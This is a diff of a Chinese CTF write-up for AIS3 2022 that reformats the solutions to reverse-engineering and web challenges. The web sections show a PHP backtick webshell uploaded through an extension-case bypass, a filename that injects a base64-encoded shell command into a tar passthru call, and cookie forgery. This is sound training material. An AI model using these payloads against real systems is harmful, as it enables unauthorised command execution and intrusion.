@@ -38,7 +38,7 @@ title: AIS3 2022 Pre-exam Writeup
 7. 執行 patch 後的 binary 即可得到 flag，但因為最後會輸出 `\r`，因此要邊輸出邊按換行避免輸出被蓋掉。
 <img width="600" alt="time-management-flag" src="https://user-images.githubusercontent.com/38059464/176664787-295a4753-cfaa-4479-b3ce-7bd92ddad48c.png">
 
-**Flag: `AIS3{You_are_the_master_of_time_management!!!!!}`**
+Flag: `AIS3{You_are_the_master_of_time_management!!!!!}`
 
 ### Calculator
 
@@ -67,7 +67,7 @@ title: AIS3 2022 Pre-exam Writeup
     # more checks...
     ```
 
-**Flag: `AIS3{D0T_N3T_FRAm3W0rk_15_S0_C0mPlicaT3d__G_G}`**
+Flag: `AIS3{D0T_N3T_FRAm3W0rk_15_S0_C0mPlicaT3d__G_G}`
 
 ### 殼
 
@@ -95,7 +95,7 @@ title: AIS3 2022 Pre-exam Writeup
 4. 後來實在是懶得看又醜又長的 JavaScript，觀察輸入之後發現每 3 個輸入字元決定 2 個輸出字元，因此把 mapping 建出來，就能直接從答案反推輸入了。所有組合大概有 1000000 組，最後花了 6~8 個小時建出大概 8 成的 mapping，然後反推輸入得到 flag。
 <img width="1372" alt="wenyan-guess" src="https://user-images.githubusercontent.com/38059464/176668657-68797378-5fea-4173-a99a-fb3aa1289847.png">
 
-**Flag: `AIS3{chaNcH4n_a1_Ch1k1ch1k1_84n8An_M1nNa_5upa5utA_n0_TAMa90_5a}`**
+Flag: `AIS3{chaNcH4n_a1_Ch1k1ch1k1_84n8An_M1nNa_5upa5utA_n0_TAMa90_5a}`
 
 ### Flag Checker
 
@@ -183,30 +183,24 @@ title: AIS3 2022 Pre-exam Writeup
     print(flag)
     ```
 
-**Flag: `AIS3{from_rop_to_python_to_pickle_to_math}`**
+Flag: `AIS3{from_rop_to_python_to_pickle_to_math}`
 
 ### Rideti
 
 1. 字串中的 `@CONGRATULATIONS!` 應該是我們的目標。
-
 <img width="589" alt="rideti-strings" src="https://user-images.githubusercontent.com/38059464/176874153-6c012257-c844-4f0d-8a03-aa7cf079f50d.png">
 
 2. IDA 不認得 string。觀察字串的使用方式後，可以建出 `my_string` struct 然後 apply 到字串上。
-
 <img width="879" alt="rideti-my-string" src="https://user-images.githubusercontent.com/38059464/176874522-07ab2d89-402d-46d4-b86e-7b86724d4826.png">
 
 3. 經過一番逆向後，可以發現去到勝利畫面 `scene_final` 的條件為 `scene_state = 2`，而當分數 `score = 3962971405739` 時，`scene_state` 被設成 2。
-
-
 <img width="623" alt="rideti-scene-final" src="https://user-images.githubusercontent.com/38059464/176875514-7adf1c53-0eac-4d3d-b37f-8bea4acb5cee.png">
-
 <img width="681" alt="rideti-set-scene-2" src="https://user-images.githubusercontent.com/38059464/176875762-a279a0cc-25d3-4768-a2b2-c13f4b4dd793.png">
 
 4. 用 [`x64dbg`](https://x64dbg.com) 在走到 check 時手動把 `score` 改成 `3962971405739` 即可拿到 flag。`x64dbg` 使用教學可以參考[這個](https://morosedog.gitlab.io/categories/x64dbg/page/4/)。
-
 <img width="727" alt="rideti-flag" src="https://user-images.githubusercontent.com/38059464/176876978-cc14e03d-32e7-4929-a672-fb5082393f18.png">
 
-**Flag: 沒有存到當時給的 flag 字體的網站，所以就看圖吧**
+Flag: 沒有存到當時給的 flag 字體的網站，所以就看圖吧 XD
 
 
 ### Strings
@@ -221,30 +215,27 @@ title: AIS3 2022 Pre-exam Writeup
 <img width="800" alt="strings-trim-split" src="https://user-images.githubusercontent.com/38059464/176866068-7bb79a10-e436-4428-80f1-38a989767843.png">
 
 4. `split` 之後存入 `vec` 型態，然後進入共 11 次的 loop。由此可以猜測 flag 裡應該由 10 個 `_` 和 11 個字串組合而成。
-
 <img width="759" alt="strings-11-loop" src="https://user-images.githubusercontent.com/38059464/176867065-ed4d987a-c9c4-4366-8e9e-b503cfe1e413.png">
 
 5. loop 裡 `memcpy` 了 11 個 integer `some_index`，然後用這些 integer 去 index 最一開始看到的類似 flag 的字串 `FLAG`，再和輸入進行比較。因此猜測這 11 個數字便是 `FLAG` 裡組成 flag 的字串的 index。
-
 <img width="800" alt="strings-memcpy-flag" src="https://user-images.githubusercontent.com/38059464/176867668-cc0d418b-b9a6-4b2b-bf74-fcfb4206f8ff.png">
-
 <img width="348" alt="strings-some-index" src="https://user-images.githubusercontent.com/38059464/176869148-23affeb7-168a-4652-9f0f-9d58fc3b7a49.png">
 
 6. 驗證上述猜測便是 flag。
 
-```python
-flags = ['AIS3{', 'good', 'luck', 'finding', 'the', 'flags', 'value', 'using', 'strings',
-         'command', 'guess', 'which', 'substring', 'is', 'our', 'actual', 'answer', 'lmaoo', '}']
-indexes = [0, 0x4, 0x10, 0xd, 0xa, 0x4, 0x8, 0x7, 0x1, 0x2, 0x12]
+    ```python
+    flags = ['AIS3{', 'good', 'luck', 'finding', 'the', 'flags', 'value', 'using', 'strings',
+             'command', 'guess', 'which', 'substring', 'is', 'our', 'actual', 'answer', 'lmaoo', '}']
+    indexes = [0, 0x4, 0x10, 0xd, 0xa, 0x4, 0x8, 0x7, 0x1, 0x2, 0x12]
 
-flag = []
-for i in indexes:
-    flag.append(flags[i])
+    flag = []
+    for i in indexes:
+        flag.append(flags[i])
 
-print('_'.join(flag))
-```
+    print('_'.join(flag))
+    ```
 
-**Flag: `AIS3{_the_answer_is_guess_the_strings_using_good_luck_}`**
+Flag: `AIS3{_the_answer_is_guess_the_strings_using_good_luck_}`
 
 ## Web
 ### Poking Bear
@@ -252,62 +243,66 @@ print('_'.join(flag))
 1. 網頁上顯示的 bear 的 URL 為 `/bear/<n>`，因此猜測要找的 bear 應該也是同樣的格式。
 
 2. 產生 `0` ~ `1000` 的 wordlist `bear.txt`，然後用 `ffuf` 進行爆搜，並將沒有 bear 的結果過濾掉。找到唯一不在網頁上的 bear `499` 即為 secret bear。
-```bash
-$ ffuf -u http://chals1.ais3.org:8987/bear/FUZZ -w ./bear.txt | grep -v 'Size: 1358 ./fuzz_bear.txt
-5                       [Status: 200, Size: 1742, Words: 295, Lines: 42]
-29                      [Status: 200, Size: 1743, Words: 295, Lines: 42]
-82                      [Status: 200, Size: 1743, Words: 295, Lines: 42]
-327                     [Status: 200, Size: 1744, Words: 295, Lines: 42]
-350                     [Status: 200, Size: 1740, Words: 295, Lines: 42]
-499                     [Status: 200, Size: 1847, Words: 335, Lines: 46]
-777                     [Status: 200, Size: 1744, Words: 295, Lines: 42]
-999                     [Status: 200, Size: 1744, Words: 295, Lines: 42]
-```
+
+    ```bash
+    $ ffuf -u http://chals1.ais3.org:8987/bear/FUZZ -w ./bear.txt | grep -v 'Size: 1358 ./fuzz_bear.txt
+    5                       [Status: 200, Size: 1742, Words: 295, Lines: 42]
+    29                      [Status: 200, Size: 1743, Words: 295, Lines: 42]
+    82                      [Status: 200, Size: 1743, Words: 295, Lines: 42]
+    327                     [Status: 200, Size: 1744, Words: 295, Lines: 42]
+    350                     [Status: 200, Size: 1740, Words: 295, Lines: 42]
+    499                     [Status: 200, Size: 1847, Words: 335, Lines: 46]
+    777                     [Status: 200, Size: 1744, Words: 295, Lines: 42]
+    999                     [Status: 200, Size: 1744, Words: 295, Lines: 42]
+    ```
 
 3. 需要成為 `bear poker`，因此將 Cookie 的 `human` 設成 `bear poker`，再 poke 一次就拿到 flag。
-```bash
-$ curl http://chals1.ais3.org:8987/bear/499
-Hello human, you need to be a "bear poker" to poke the SECRET BEAR.
-$ curl http://chals1.ais3.org:8987/poke -H 'Cookie: human=bear poker' -d 'bear _id=499' -H 'Content-Type: application/x-www-form-urlencoded'
-<script>alert(`AIS3{y0u_P0l<3_7h3_Bear_H@rdLy><}`); location='/'</script>
-```
 
-**Flag: `AIS3{y0u_P0l<3_7h3_Bear_H@rdLy><}`**
+    ```bash
+    $ curl http://chals1.ais3.org:8987/bear/499
+    Hello human, you need to be a "bear poker" to poke the SECRET BEAR.
+    $ curl http://chals1.ais3.org:8987/poke -H 'Cookie: human=bear poker' -d 'bear _id=499' -H 'Content-Type: application/x-www-form-urlencoded'
+    <script>alert(`AIS3{y0u_P0l<3_7h3_Bear_H@rdLy><}`); location='/'</script>
+    ```
+
+Flag: `AIS3{y0u_P0l<3_7h3_Bear_H@rdLy><}`
 
 ### Simple File Uploader
 
 1. 不能上傳 `php`, `php2`, `php3`, `php4`, `php5`, `php6`, `phar`, `phtm`，可以用 `pHP` bypass 檢查。
 2. Ban 掉一堆危險 function，可以用 `` ` `` 執行 shell command 讀取 flag。
 
-```php
-<?php
-echo(`/rUn_M3_t0_9et_fL4g`);
-?>
-```
+    ```php
+    <?php
+    echo(`/rUn_M3_t0_9et_fL4g`);
+    ?>
+    ```
 
-**Flag: 忘了留...**
+Flag: 忘了留...
 
 ### Tari Tari
 1. 上傳 `trash.txt` 後，網頁提供的下載網址為 `http://chals1.ais3.org:9453/download.php?file=MjY1MDEwZmI2MDg2NGU1MGFjZTg5Y2RkYjE4ZmQxZjIudGFyLmd6&name=trash.txt.tar.gz`。把 `file` base64 decode 得到 `265010fb60864e50ace89cddb18fd1f2.tar.gz`，由此猜測 `file` 可以讀取任意檔案。
 
 2. 讀取 `index.php`，發現其使用 `passthru` 執行 shell command，而 `$filename` 為使用者可控，因此可以 RCE。
-```php
-$filename = $file['name'];
-$path = bin2hex(random_bytes(16)) . ".tar.gz";
-$source = substr($file['tmp_name'], 1);
-$destination = "./files/$path";
-passthru("tar czf '$destination' --transform='s|$source|$filename|' --directory='/tmp' '/$source'", $return);
-```
+
+    ```php
+    $filename = $file['name'];
+    $path = bin2hex(random_bytes(16)) . ".tar.gz";
+    $source = substr($file['tmp_name'], 1);
+    $destination = "./files/$path";
+    passthru("tar czf '$destination' --transform='s|$source|$filename|' --directory='/tmp' '/$source'", $return);
+    ```
 
 3. 上傳檔案即可讀到 flag。
-```bash
-$ echo abc >  "'|| echo $(echo -n cat /y000000_i_am_the_f14GGG.txt | base64) | base64 -d | bash;#"
-$ ls
-total 32K
--rw-r--r-- 1 ice1187 ice1187    0 May 15 18:16 ''\''|| echo Y2F0IC95MDAwMDAwX2lfYW1fdGhlX2YxNEdHRy50eHQ= | base64 -d | bash;#'
-```
 
-**Flag: `AIS3{test_flag (to be changed)}`**  (這個 flag 有夠迷惑...)
+    ```bash
+    $ echo abc >  "'|| echo $(echo -n cat /y000000_i_am_the_f14GGG.txt | base64) | base64 -d | bash;#"
+    $ ls
+    total 32K
+    -rw-r--r-- 1 ice1187 ice1187    0 May 15 18:16 ''\''|| echo Y2F0IC95MDAwMDAwX2lfYW1fdGhlX2YxNEdHRy50eHQ= | base64 -d | bash;#'
+    ```
+
+Flag: `AIS3{test_flag (to be changed)}` (這個 flag 有夠迷惑...)
 
 ### The Best Login UI
 
@@ -319,7 +314,7 @@ total 32K
 
 3. 使用 [`$regex`](https://www.mongodb.com/docs/manual/reference/operator/query/regex/#mongodb-query-op.-regex) 把 flag 爆出來，當時寫的 script 超醜就不貼了...。
 
-**Flag: `AIS3{Bl1nd-b4s3d r3gex n0sq1i?! (:3[___]}`**
+Flag: `AIS3{Bl1nd-b4s3d r3gex n0sq1i?! (:3[___]}`
 
 ## Pwn
 
